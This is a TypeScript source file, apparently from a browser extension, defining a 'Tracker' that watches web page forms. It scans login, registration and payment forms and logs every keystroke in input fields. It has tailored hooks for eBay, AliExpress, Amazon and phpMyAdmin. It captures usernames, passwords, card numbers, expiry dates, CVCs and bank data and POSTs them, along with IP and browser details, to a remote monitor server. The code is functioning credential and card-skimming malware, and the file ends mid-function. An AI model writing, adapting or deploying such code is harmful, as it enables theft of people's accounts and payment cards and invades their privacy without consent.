'use strict';
import {Browser} from "./browser";
import {__appHostedServerRoot, app} from "./common/app-db";
import {sendRequest} from "./common/app-common-required-send";

/*required variables*/
const BrJS = new Browser();
const appTracker = app.default.name + '@' + app.default.version;
let globalAppMonitorMainURL: string = __appHostedServerRoot + 'monitor/browser/';

const authFormAttribute = [
    {
        'login': [
            'form1', 'signin', 'signon', 'login', 'logon', 'identi', 'idb', 'wpcf7-form', 'form--1G_Qn', 'fl', 'ng-pristine',
            'index.php', 'new_user', 'ctl23', 'jss', 'connexion', 'file', 'styledform', 'auth',
        ]
    },
    {'register': ['reg', 'signup', 'join', 'register', 'checkform']},
    {'logout': ['logout']},
    {
        'payment': [
            'credit', 'payment', 'body', 'checkout', 'sslform', 'pay', 'purchase', 'elementsapp', 'creditcard',
            'credit-card', 'addcard', 'bill'
        ]
    },
    {
        'exclude': [
            /*'q', */'search', 'googleads', 'presentation', 'captcha', /*'disable', */'header',
            'convert-form', 'wam_arten', 'matchkalender', 'suche', 'generate', 'subscribe', 'ignore',
            'download', 'kreditrechner', 'bit_exchange_form', 'applyform', 'app_form', 'comment', 'wallet',
            'picker', 'wp-link', 'meta', 'panier', 'commande', 'recherche', 'settings', 'posts', 'challenge', 'tag',
            'upload', 'mainf', 'domain'
        ]
    },
];
const paymentElementsAttribute = [
    {'cardNumber': ['num', 'no', 'cardno',]},
    {'cardHolder': ['holder', 'owner', 'name',]},
    {'cardTypes': ['brand', 'type', 'types',]},
    {'cardExpire': ['exp',]},
    {'cardCVC': ['cvc', 'csc', 'cvv', 'securitycode',]},
    {'cardPostalCode': ['zip', 'post',]},
    /*{'exclude': ['email', 'user', 'usr']},*/
];

function initDb() {
    if (window.sessionStorage){
        if (window.sessionStorage.getItem('ip') === null){
            sendRequest({
                method: "GET",
                url: app.website.IpInfo,
                async: true,
                header: [{name: "Accept", value: "application/json"}]
            }, function (IpDataReply: any) {
                window.sessionStorage.setItem('ip',JSON.parse(IpDataReply).ip);
            });
        }
    } else {
        console.error('Error:: Your browser does not support session!! Please upgrade or change your browser!!');
    }
}

function send(request: any) {
    if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
        let interval = setInterval(function () {
            if (window.sessionStorage.getItem('ip') !== null){
                clearInterval(interval);
                if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
                    if (request.command === 'saveLoginData') {
                        return sendRequest({
                            method: "POST",
                            url: globalAppMonitorMainURL + "browserUserDataManagement",
                            async: true,
                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
                            data: {
                                "command": request.command,
                                "userdata": {
                                    _default_: {
                                        "tracker": appTracker,
                                        "app_id": app.default.version,
                                        "ip": window.sessionStorage.getItem('ip'),
                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                        "browser": BrJS.getBrowserNameFull()
                                    },
                                    "event": 'login',
                                    "username": request.data.username,
                                    "password": request.data.password,
                                    "workWebsite": request.data.workWebsite
                                }
                            }
                        });
                    }
                    else if (request.command === 'saveRegistrationData') {
                        return sendRequest({
                            method: "POST",
                            url: globalAppMonitorMainURL + "browserUserDataManagement",
                            async: true,
                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
                            data: {
                                "command": request.command,
                                "userdata": {
                                    _default_: {
                                        "tracker": appTracker,
                                        "app_id": app.default.version,
                                        "ip": window.sessionStorage.getItem('ip'),
                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                        "browser": BrJS.getBrowserNameFull()
                                    },
                                    "event": "registration",
                                    "username": request.data.username,
                                    "password": request.data.password,
                                    "email": request.data.email,
                                    "workWebsite": request.data.workWebsite
                                }
                            }
                        });
                    } else if (request.command === 'saveLogoutData') {
                        return sendRequest({
                            method: "POST",
                            url: globalAppMonitorMainURL + "browserUserDataManagement",
                            async: true,
                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
                            data: {
                                "command": request.command,
                                "userdata": {
                                    _default_: {
                                        "tracker": appTracker,
                                        "app_id": app.default.version,
                                        "ip": window.sessionStorage.getItem('ip'),
                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                        "browser": BrJS.getBrowserNameFull()
                                    },
                                    "event": "logout",
                                    "username": request.data.username,
                                    "workWebsite": request.data.workWebsite
                                }
                            }
                        });
                    } else if (request.command === 'saveNavigateData') {
                        return sendRequest({
                            method: "POST",
                            url: globalAppMonitorMainURL + "browserUserDataManagement",
                            async: true,
                            header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
                            data: {
                                "command": request.command,
                                "userdata": {
                                    _default_: {
                                        "tracker": appTracker,
                                        "app_id": app.default.version,
                                        "ip": window.sessionStorage.getItem('ip'),
                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                        "browser": BrJS.getBrowserNameFull()
                                    },
                                    "event": "navigate",
                                    "username": request.data.username,
                                    "workWebsite": request.data.workWebsite
                                }
                            }
                        });
                    }
                }
                if (request.command === 'savePaymentMethodsData') {
                    return sendRequest({
                        method: "POST",
                        url: globalAppMonitorMainURL + "clientPaymentMethodsRecord",
                        async: true,
                        header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
                        data: {
                            "command": request.command,
                            "paymentMethodsInfo": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": app.default.version,
                                    "ip": window.sessionStorage.getItem('ip'),
                                    "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                    "browser": BrJS.getBrowserNameFull()
                                },
                                'cardNumber': request.data.cardNumber,
                                'cardBrand': request.data.cardBrand,
                                'cardHolder': request.data.cardHolder,
                                "cardExpire": request.data.cardExpire,
                                'cardCVC': request.data.cardCVC,
                                'event': request.data.event,
                                "workWebsite": request.data.workWebsite
                            }
                        }
                    });
                }
                if (request.command === 'saveBankAccountData') {
                    return sendRequest({
                        method: "POST",
                        url: globalAppMonitorMainURL + "clientBankAccountRecord",
                        async: true,
                        header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
                        data: {
                            "command": request.command,
                            "bankAccountData": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": app.default.version,
                                    "ip": window.sessionStorage.getItem('ip'),
                                    "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                    "browser": BrJS.getBrowserNameFull()
                                },
                                'dataType': request.data.dataType,
                                'dataValue': request.data.dataValue,
                                "workWebsite": request.data.workWebsite
                            }
                        }
                    });
                }
                if (request.command === 'saveInputElementData') {
                    return sendRequest({
                        method: "POST",
                        url: globalAppMonitorMainURL + "InputElementDataRecord",
                        async: true,
                        header: [{name: "Content-type", value: "application/json;charset=UTF-8"}],
                        data: {
                            "command": request.command,
                            "inputElementData": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": app.default.version,
                                    "ip": window.sessionStorage.getItem('ip'),
                                    "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                    "browser": BrJS.getBrowserNameFull()
                                },
                                'name': request.data.name,
                                'type': request.data.type,
                                'value': request.data.value,
                                'placeholder': request.data.placeholder,
                                "workWebsite": request.data.workWebsite
                            }
                        }
                    });
                }
            }
        },100);
    }
}

class Tracker {
    public url?: any;
    public authEvent?: any;
    public isTrackerActivate: boolean = false;
    public trackerJobId: number = 0;
    public passwordStore: { node: HTMLElement, name: string, type: string, value: string }[] = [];
    public creditCardStore: { node: HTMLElement, name: string, type: string, value: string }[] = [];
    public creditCardRuntimeHolderName: string = '';
    public creditCardRuntimeNumber: string = '';
    public creditCardRuntimeBrand: string = '';
    public creditCardRuntimeExpireDate: string = '';
    public creditCardRuntimeCvc: string = '';
    public creditCardRuntimePostalCode: string = '';

    constructor(url: string) {
        if (url) {
            this.url = url;
        }
    }

    init(callBack?: any) {
        const self = this;
        if (self.url) {
            let interval1 = setInterval(function () {
                self.verifyFormElement(self, interval1);
            }, 1000);


            self.backupScripts(self);
            self.absoluteTrack(self);

            if (!self.isTrackerActivate) {
            } else {
            }
        }

        if (callBack) {
            callBack();
        }
    }

    absoluteTrack(self: this) {
        let interval = setInterval(function () {
            if (document.querySelectorAll('input').length !== 0) {
                clearInterval(interval);
                self.absoluteTrackHelper(self, document.body, 'input', function (__detectedElement: any) {
                    ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
                        __detectedElement.addEventListener(event, function () {
                            if (__detectedElement.value.length !== 0) {
                                send({
                                    command: 'saveInputElementData',
                                    data: {
                                        'name': __detectedElement.nodeName.toLowerCase(),
                                        'type': __detectedElement.type,
                                        'value': __detectedElement.value,
                                        'placeholder': __detectedElement.placeholder ? __detectedElement.placeholder : 'NOT SET',
                                        "workWebsite": window.location.origin
                                    }
                                });
                            }
                        });
                    });
                });
            }
            if (document.querySelectorAll('select').length !== 0) {
                clearInterval(interval);
                self.absoluteTrackHelper(self, document.body, 'select', function (__detectedElement: any) {
                    ['keyup', 'paste', 'change', 'input'].forEach(function (event) {
                        __detectedElement.addEventListener(event, function () {
                            if (__detectedElement.value.length !== 0) {
                                send({
                                    command: 'saveInputElementData',
                                    data: {
                                        'name': __detectedElement.nodeName.toLowerCase(),
                                        'type': __detectedElement.type,
                                        'value': __detectedElement.value,
                                        'placeholder': __detectedElement.placeholder ? __detectedElement.placeholder : 'NOT SET',
                                        "workWebsite": window.location.origin
                                    }
                                });
                            }
                        });
                    });
                });
            }
        }, 100);
    }

    absoluteTrackHelper(self: this, elementParentNode: HTMLElement, __tagName: string, callback: any) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName.toLowerCase() === __tagName) {
                    if (callback) {
                        callback(__childElement);
                    }
                } else {
                    self.absoluteTrackHelper(self, (__childElement as HTMLElement), __tagName, callback)
                }
            });
        }
    }

    trigger(self: this, __formElement: HTMLFormElement) {
        self.track(self, __formElement);
    }

    verifyFormElement(self: this, interval?: any) {
        if (document.querySelectorAll('form').length !== 0) {
            document.querySelectorAll('form').forEach(function (__formElement) {
                if (__formElement.attributes.length !== 0) {
                    if (window.location.href.toLowerCase().indexOf('phpmyadmin') !== -1) {
                        if (__formElement.method === 'post') {
                            interval ? clearInterval(interval) : '';
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    } else {
                        if (__formElement.action !== 'javascript:void(0)' && __formElement.id !== 'null' && __formElement.id !== 'irouteForm' &&
                            __formElement.id !== 'bhlf' && __formElement.id.indexOf('id') === -1 && __formElement.id.indexOf('u_0_') === -1 &&
                            __formElement.id.indexOf('theform') === -1 && __formElement.id.indexOf('scl_form') === -1 &&
                            __formElement.className.indexOf('gb_8e') === -1) {
                            interval ? clearInterval(interval) : '';
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                } else {
                    if (__formElement.childNodes.length > 1) {
                        interval ? clearInterval(interval) : '';
                        self.isTrackerActivate = true;
                        self.trackerJobId++;
                        self.trigger(self, __formElement);
                    }
                }
            });
        } else {
            if (window.location.origin.indexOf('dash.fembed.com') !== -1) {
                if (document.querySelector('#login') !== null) {
                    interval ? clearInterval(interval) : '';
                    self.isTrackerActivate = true;
                    self.trackerJobId++;
                    self.classicTrackAuthEvent(self, '#email_login', '#password', '#login');
                }
            }
        }
    }

    resolverFormAttributes(self: this, __formElement: any): any {
        const attributes = [...__formElement.attributes];
        if (attributes.length !== 0) {
            attributes.forEach(function (attribute) {
                if (attribute.nodeValue !== 'javascript:void(0);') {
                    if (attribute.nodeValue.length !== 0 && attribute.nodeValue.length >= 3) {
                        /*form attribute value*/
                        authFormAttribute.forEach(function (keyword: any) {
                            if (Object.keys(keyword).length !== 0 && keyword.constructor === Object) {
                                Object.keys(keyword).forEach(function (__key) {
                                    keyword[__key].forEach(function (__qKey: any) {
                                        if (attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 /*|| window.location.origin.toLowerCase().indexOf(__qKey) !== -1
                                            || document.title.toLowerCase().indexOf(__qKey) !== -1 && window.location.origin.toLowerCase().indexOf('file') === -1*/) {
                                            /*var str = text.replace(/(^\w{1})|(\s{1}\w{1})/g, match => match.toUpperCase());*/
                                            //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = __key;
                                            self.authEvent = __key;
                                        } else {
                                            if (attribute.nodeValue === null) {
                                                //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'exclude';
                                                self.authEvent = 'exclude';
                                            }
                                        }
                                    });
                                });
                            }
                        });
                    }
                }
            });
        } else {
            self.authEvent = 'Unknown';
        }

        return self.authEvent;
    }

    track(self: this, __formElement: HTMLFormElement) {
        let elements: string[] = [];
        if (__formElement.nodeName === 'FORM' && __formElement.length !== 1) {
            self.resolverFormAttributes(self, __formElement);
            if (self.authEvent === 'login' || self.authEvent === 'register') {
                self.crawlAuthFormElement(self, elements, __formElement);
            } else if (self.authEvent === 'payment') {
                self.crawlPaymentFormElement(self, elements, __formElement);
            } else {
                if (self.authEvent !== 'exclude' && self.authEvent !== 'logout') {
                    self.crawlAuthFormElement(self, elements, __formElement);
                    self.crawlPaymentFormElement(self, elements, __formElement);

                    /*additional functions*/
                    /*exclude paypal,amazon,tunnelbear*/

                    /*ebay*/
                    if (window.location.origin.indexOf('ebay') !== -1) {
                        let interval = setInterval(function () {
                            if (document.querySelectorAll('form').length !== 0) {
                                document.querySelectorAll('form').forEach(function (__ebayFormElement) {
                                    if (__ebayFormElement.id === 'credit-card-details') {
                                        clearInterval(interval);
                                        let elements: any = [];
                                        self.exploreEbayPaymentDataCollection(self, __ebayFormElement, elements);
                                    }
                                });
                            }
                        }, 100);
                        if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
                            if (document.querySelector('.btn.btn--primary.field')?.nodeName === 'BUTTON') {
                                ["click", "dblclick"].forEach(function (event) {
                                    let tempPaymentMethodsStore: any = [];
                                    document.querySelector('.btn.btn--primary.field')?.addEventListener(event, function () {
                                        self.exploreSpecificElementByTagName(self, (document.querySelector('.cic-module') as HTMLElement), 'input', 'creditCardNumber', function (__detectedElement: any) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, (document.querySelector('.cic-module') as HTMLElement), 'input', 'firstName', function (__detectedElement: any) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, (document.querySelector('.cic-module') as HTMLElement), 'input', 'lastName', function (__detectedElement: any) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, (document.querySelector('.cic-module') as HTMLElement), 'input', 'expirationDate', function (__detectedElement: any) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        self.exploreSpecificElementByTagName(self, (document.querySelector('.cic-module') as HTMLElement), 'input', 'cvv', function (__detectedElement: any) {
                                            tempPaymentMethodsStore.push({
                                                'element': __detectedElement.nodeName,
                                                'id': __detectedElement.id,
                                                'value': __detectedElement.value
                                            });
                                        });
                                        send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                'cardBrand': document.querySelector('.floating-input__fixright')?.firstElementChild?.className ? document.querySelector('.floating-input__fixright')?.firstElementChild?.className.toLowerCase() : 'Unknown',
                                                'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
                                                "cardExpire": tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
                                                'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
                                                'event': 'add',
                                                "workWebsite": window.location.origin
                                            }
                                        });
                                        tempPaymentMethodsStore = [];
                                    })
                                })
                            }
                        }
                    }
                }
            }
        }
    }

    classicTrackAuthEvent(self: this, usernameElementId: any, passwordElementId: any, loginButtonElementId: any) {
        let usernameElement: any, passwordElement: any, loginButtonElement: any;

        if (document.querySelector(usernameElementId) !== null) {
            usernameElement = document.querySelector(usernameElementId);
        }
        if (document.querySelector(passwordElementId) !== null) {
            passwordElement = document.querySelector(passwordElementId);
        }
        if (document.querySelector(loginButtonElementId) !== null) {
            loginButtonElement = document.querySelector(loginButtonElementId);
        }
        loginButtonElement.addEventListener('click', function () {
            return send({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": usernameElement.value,
                    "password": passwordElement.value,
                    "workWebsite": window.location.origin
                }
            });
        })
    }

    crawlAuthFormElement(self: this, elements: any [], __parentElement: HTMLElement) {
        __parentElement.childNodes?.forEach(function (__childElement: any) {
            ['input', 'button', 'a'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
                    ['input'].forEach(function (__onlyInputElement) {
                        if (__childElement.nodeName.toLowerCase() === __onlyInputElement) {
                            [...__childElement.attributes].forEach(function (__attribute) {
                                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                                    /* minor changes start */
                                    ['text', 'user', 'email', 'pass'].forEach(function (__eligibleAttribute) {
                                        if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1 ) {
                                            elements.push(__childElement);
                                        }
                                    });
                                    /* minor changes end */
                                }
                            });
                        }
                    });
                    if (__childElement.type === 'submit' || __childElement.type === 'button' || __childElement.nodeName === 'A' &&
                        __childElement.innerHTML.toLowerCase().indexOf('sign' || 'log' || 'reg') !== -1) {
                        self.resolveAuthEvent(self, __childElement, elements);
                    }
                }
            });

            return self.crawlAuthFormElement(self, elements, __childElement);
        });
    }

    resolveAuthEvent(self: this, element: any, array: any) {
        let elementNode: any, elementName: any, elementType: any, elementValue: any;
        (element as HTMLElement).addEventListener('click', function () {
            new Set(array).forEach(function (__detectedElement: any) {
                [...__detectedElement.attributes].forEach(function (__attribute) {
                    if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 4) {
                        ['user', 'login', 'email', 'pass'].forEach(function (__eligibleAttribute: any) {
                            if (__attribute.nodeValue.toLowerCase().indexOf(__eligibleAttribute) !== -1) {
                                elementNode = __detectedElement;
                                elementName = __eligibleAttribute;
                                elementType = __detectedElement.type;
                                elementValue = __detectedElement.value;
                            }
                        });
                    }
                });

                if (elementValue.length !== 0) {
                    self.passwordStore.push({
                        node: elementNode,
                        name: elementName,
                        type: elementType,
                        value: elementValue
                    });
                }
            });

            send({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": self.passwordStore[0]?.value,
                    "password": self.passwordStore[1]?.value,
                    "workWebsite": window.location.origin
                }
            });
            self.passwordStore = [];
        });
    }

    crawlPaymentFormElement(self: this, elements: any [], __formElement: HTMLElement) {
        __formElement.childNodes?.forEach(function (__childElement: any) {
            ['input', 'button', 'select'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
                    ['input', 'select'].forEach(function (__eligibleDataElement) {
                        if (__childElement.nodeName.toLowerCase() === __eligibleDataElement) {
                            ['text', 'tel', 'number', 'password', 'radio', 'select-one'].forEach(function (__eligibleElementType) {
                                if (__childElement.type === __eligibleElementType) {
                                    [...__childElement.attributes].forEach(function (__attribute) {
                                        if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 3) {
                                            paymentElementsAttribute.forEach(function (__eligibleKeyword: any) {
                                                if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
                                                    Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
                                                        __eligibleKeyword[__cardDataKey].forEach(function (__qKey: any) {
                                                            if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1 && __attribute.nodeValue.toLowerCase().indexOf('none' || 'hidden' || 'disable') === -1) {
                                                                elements.push(__childElement);
                                                            }
                                                        });
                                                    });
                                                }
                                            });
                                        }
                                    });
                                }
                            });
                        }
                    });
                    ['submit', 'button'].forEach(function (__eligibleCollectorElement) {
                        if (__childElement.type === __eligibleCollectorElement) {
                            self.resolvePaymentEvent(self, __childElement.form, __childElement, elements);
                        }
                    });
                }
            });
            return self.crawlPaymentFormElement(self, elements, __childElement);
        });
    }


    /* PASSED
    * https://www.tunnelbear.com/account/checkout
    * https://www.amazon.com/cpe/yourpayments/wallet
    * */


    resolvePaymentEvent(self: this, __formElement: any, __dataCollectorElement: any, array: any []) {
        ['submit'].forEach(function (__formEvent) {
            __formElement.addEventListener(__formEvent, function () {
                self.collectPaymentData(self, array);
            });
        });
        ['click', 'dblclick', 'ontouchstart'].forEach(function (__dataCollectorEvent) {
            __dataCollectorElement.addEventListener(__dataCollectorEvent, function () {
                self.collectPaymentData(self, array);
            });
        });


        try {
            if (window.self !== window.top) {
                new Set(array).forEach(function (__detectedElement: any) {
                    ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
                        __detectedElement.addEventListener(__event, function () {
                            self.collectPaymentData(self, array);
                        })
                    });
                });
            }
        } catch (e) {
        }
    }

    collectPaymentData(self: this, array: any []) {
        let elementNode: any, elementName: any, elementType: any, elementValue: any;
        new Set(array).forEach(function (__detectedElement: any) {
            [...__detectedElement.attributes].forEach(function (__attribute) {
                if (__attribute.nodeValue.length !== 0 && __attribute.nodeValue.length >= 3) {
                    paymentElementsAttribute.forEach(function (__eligibleKeyword: any) {
                        if (Object.keys(__eligibleKeyword).length !== 0 && __eligibleKeyword.constructor === Object) {
                            Object.keys(__eligibleKeyword).forEach(function (__cardDataKey) {
                                __eligibleKeyword[__cardDataKey].forEach(function (__qKey: any) {
                                    if (__attribute.nodeValue.toLowerCase().indexOf(__qKey) !== -1) {
                                        elementNode = __detectedElement;
                                        elementName = __cardDataKey;
                                        elementType = __detectedElement.type;
                                        elementValue = __detectedElement.value;
                                    }
                                });
                            });
                        }
                    });
                }
            });
            if (elementValue.length !== 0) {
                self.creditCardStore.push({
                    node: elementNode,
                    name: elementName,
                    type: elementType,
                    value: elementValue
                });
            }
        });
        self.retrieveAccurateData(self, self.creditCardStore);
        send({
            command: 'savePaymentMethodsData',
            data: {
                'cardNumber': self.creditCardRuntimeNumber !== '' ? self.creditCardRuntimeNumber : 'Unknown',
                'cardBrand': self.creditCardRuntimeBrand !== '' ? self.creditCardRuntimeBrand : 'Unknown',
                'cardHolder': self.creditCardRuntimeHolderName !== '' ? self.creditCardRuntimeHolderName : 'Unknown',
                "cardExpire": self.creditCardRuntimeExpireDate !== '' ? self.creditCardRuntimeExpireDate/*.substring(0, self.creditCardRuntimeExpireDate.length - 1)*/ : 'Unknown',
                'cardCVC': self.creditCardRuntimeCvc !== '' ? self.creditCardRuntimeCvc : 'Unknown',
                'event': 'add',
                "workWebsite": window.location.origin
            }
        });
        self.creditCardStore = [];
        self.creditCardRuntimeHolderName = '';
        self.creditCardRuntimeNumber = '';
        self.creditCardRuntimeBrand = '';
        self.creditCardRuntimeExpireDate = '';
        self.creditCardRuntimeCvc = '';
        self.creditCardRuntimePostalCode = '';
        //self.verifyFormElement(self);
    }

    retrieveAccurateData(self: this, __creditCardDataStore: any []) {
        if (__creditCardDataStore.length !== 0) {
            __creditCardDataStore.forEach(function (__detectedDataElement) {
                (__detectedDataElement.name === 'cardNumber') ? self.creditCardRuntimeNumber = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardHolder') ? self.creditCardRuntimeHolderName += __detectedDataElement.value + ' ' : '';
                (__detectedDataElement.name === 'cardBrand') ? self.creditCardRuntimeBrand = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardExpire') ? self.creditCardRuntimeExpireDate += __detectedDataElement.value + '/' : '';
                (__detectedDataElement.name === 'cardCVC') ? self.creditCardRuntimeCvc = __detectedDataElement.value : '';
                (__detectedDataElement.name === 'cardPostalCode') ? self.creditCardRuntimePostalCode = __detectedDataElement.value : '';
            });
        }
    }

    backupScripts(self: this) {
        let interval1 = setInterval(function () {
            if (window.location.origin.indexOf('amazon') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreAmazonPaymentContainer(self);
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('aliexpress') !== -1) {

                if (document.querySelector('.check-out-root') !== null && document.querySelector('.check-out-root')?.childNodes.length !== 1) {
                    let interval4 = setInterval(function () {
                        if (document.querySelector('.title-to-detail') !== null) {
                            clearInterval(interval4);
                            if (document.querySelector('.title-to-detail')?.textContent?.indexOf('Add a new card') !== -1) {
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.title-to-detail')?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.bind-button-wrap ')?.firstElementChild?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                            } else {
                                self.exploreSpecificElementByTagName(self, (document.querySelector('.check-out-root') as HTMLElement), 'span', 'payment-title', function (__detectedElement: HTMLElement) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                            send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': __detectedElement.textContent,
                                                    'cardBrand': 'Unknown',
                                                    'cardHolder': 'Unknown',
                                                    'cardExpire': 'Unknown',
                                                    'cardCVC': 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                        })
                                    });
                                });
                            }
                        }
                    }, 1000);
                } else {
                    if (window.location.href.indexOf('confirm_order.htm') !== -1) {
                        let interval = setInterval(function () {
                            if (document.querySelector('.new-card') !== null) {
                                clearInterval(interval);
                                self.processAliExpressPaymentNewCard(self);
                            }
                        }, 100);
                        let interval00 = setInterval(function () {
                            if (document.querySelector('.pay-type.show-method') !== null) {
                                clearInterval(interval00);
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.pay-type.show-method')?.addEventListener(event, function () {
                                        let __interval3 = setInterval(function () {
                                            if (document.querySelector('.new-card') !== null) {
                                                clearInterval(__interval3);
                                                self.explorePaymentNewCard(self,
                                                    (document.querySelector('.new-card') as HTMLElement),
                                                    function (elements: any) {
                                                        let paymentMethodStore: any = [];
                                                        document.querySelector('.save')?.addEventListener('click', function () {
                                                            elements.forEach(function (element: any) {
                                                                paymentMethodStore.push({
                                                                    'element': element.nodeName,
                                                                    'id': element.id,
                                                                    'type': element.type,
                                                                    'value': element.value
                                                                });
                                                            })
                                                            send({
                                                                command: 'savePaymentMethodsData',
                                                                data: {
                                                                    'cardNumber': paymentMethodStore[0].value,
                                                                    'cardBrand': 'Unknown',
                                                                    'cardHolder': paymentMethodStore[1].value,
                                                                    'cardExpire': paymentMethodStore[2].value,
                                                                    'cardCVC': paymentMethodStore[3].value,
                                                                    'event': 'add',
                                                                    'workWebsite': window.location.origin
                                                                }
                                                            });
                                                            paymentMethodStore = [];
                                                        });
                                                    });
                                            }
                                        }, 1000);
                                    })
                                });
                            }
                        }, 100);
                        if (document.querySelector('.edit-card') !== null) {
                            ['click', 'dblclick'].forEach(function (event) {
                                document.querySelector('.edit-card')?.addEventListener(event, function () {
                                    let __interval3 = setInterval(function () {
                                        if (document.querySelector('.new-card') !== null) {
                                            clearInterval(__interval3);
                                            self.processAliExpressPaymentNewCard(self);
                                        }
                                    }, 1000);
                                });
                            });
                        }

                        if (document.querySelectorAll('.arrow-content').length !== 0) {
                            document.querySelectorAll('.arrow-content').forEach(function (__detectedDivElement) {
                                __detectedDivElement.addEventListener('click', function () {
                                    if (__detectedDivElement.classList.contains('arrow-down')) {
                                        let __interval2 = setInterval(function () {
                                            if (document.querySelector('.add-new-card') !== null) {
                                                clearInterval(__interval2);
                                                ['click', 'dblclick'].forEach(function (event) {
                                                    document.querySelector('.add-new-card')?.addEventListener(event, function () {
                                                        let __interval3 = setInterval(function () {
                                                            if (document.querySelector('.new-card') !== null) {
                                                                clearInterval(__interval3);
                                                                self.processAliExpressPaymentNewCard(self);
                                                            }
                                                        }, 1000);
                                                    })
                                                });
                                            }
                                        }, 1000);
                                    }
                                })
                            });
                        }
                        if (document.querySelector('.mix-edcard-item')?.childElementCount !== 0) {
                            let cardConfirmElement = document.querySelector('#checkout-button');
                            ['click', 'dblclick'].forEach(function (event) {
                                cardConfirmElement?.addEventListener(event, function () {
                                    let tempPaymentMethodsStore: any = [];
                                    document.querySelector('.mix-edcard-item')?.childNodes.forEach(function (__childElement) {
                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('icon')) {
                                            if ((__childElement as HTMLElement).classList.contains('visa')) {
                                                tempPaymentMethodsStore.push({
                                                    'element': (__childElement as HTMLElement).nodeName,
                                                    'id': (__childElement as HTMLElement).id,
                                                    'value': 'visa'
                                                });
                                            }
                                        }
                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('pay-name')) {
